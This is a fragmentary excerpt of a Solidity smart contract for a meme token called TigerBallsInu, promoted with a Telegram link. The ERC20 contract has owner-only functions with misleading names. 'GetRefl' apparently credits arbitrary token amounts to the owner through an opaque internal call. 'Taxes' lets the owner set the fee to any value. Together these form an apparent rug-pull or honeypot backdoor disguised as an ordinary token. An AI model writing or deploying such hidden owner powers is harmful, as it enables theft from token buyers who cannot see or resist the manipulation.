...
/**                     
 * 
 *                    TigerBallsInu- Here to Conquer Crypto!
 * 
 *              https://t.me/TigerBallsInuBSC
 *               
 *                
 *               
 *               
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function GetRefl(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function Taxes(uint256 BULL) external onlyOwner(){
        _bull = BULL;
    }
...
contract TigerBallsInu is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("TigerBallsInuBSC", "TigerBallsInu") {
